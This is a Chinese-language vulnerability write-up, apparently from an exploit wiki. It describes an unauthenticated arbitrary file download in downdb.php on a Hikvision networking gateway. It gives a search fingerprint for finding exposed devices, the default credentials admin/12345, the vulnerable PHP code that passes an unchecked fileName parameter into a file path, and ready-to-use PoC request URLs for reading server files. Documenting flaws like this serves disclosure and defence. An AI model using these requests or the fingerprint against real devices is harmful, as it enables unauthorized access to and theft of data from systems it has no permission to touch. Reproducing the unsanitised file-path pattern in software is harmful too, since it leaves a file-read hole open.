# HIKVISION 联网网关 downdb.php 任意文件读取漏洞

## 漏洞描述

海康威视 联网网关 在页面 downdb.php 的参数fileName存在任意文件下载漏洞

## 漏洞影响

<a-checkbox checked>HIKVISION 联网网关，流媒体管理服务器</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"杭州海康威视系统技术有限公司 版权所有"</a-checkbox></br>

## 漏洞复现

默认密码：admin/12345

![img](../../../.vuepress/public/img/1628150554555-c84e3f6d-2054-4587-950c-5234bc7a12e8.png)

出现漏洞的代码文件为downdb.php，可以未授权下载任意文件：

```php
<?php
$file_name=$_GET['fileName'];
$file_dir = "../../../";
if   (!file_exists($file_dir.$file_name))   {   //检查文件是否存在  
  echo'<script> alert("文件不存在!");window.history.back(-1);</script>'; 
  exit();

}else{	
	$file = fopen($file_dir . $file_name,"r"); // 打开文件
	// 输入文件标签
	Header("Content-type: application/octet-stream");
	Header("Accept-Ranges: bytes");
	Header("Accept-Length: ".filesize($file_dir . $file_name));
	Header("Content-Disposition: attachment; filename=" . $file_name);
	// 输出文件内容
	echo fread($file,filesize($file_dir.$file_name));
	fclose($file);
	exit();
}
?> 
```

验证POC：

```
/localDomain/downdb.php?fileName=web/html/data/login.php
/localDomain/downdb.php?fileName=web/html/localDomain/downdb.php
```



![img](../../../.vuepress/public/img/1628152149896-c63bae3a-6cc6-402a-b234-cacb307547fc.png)



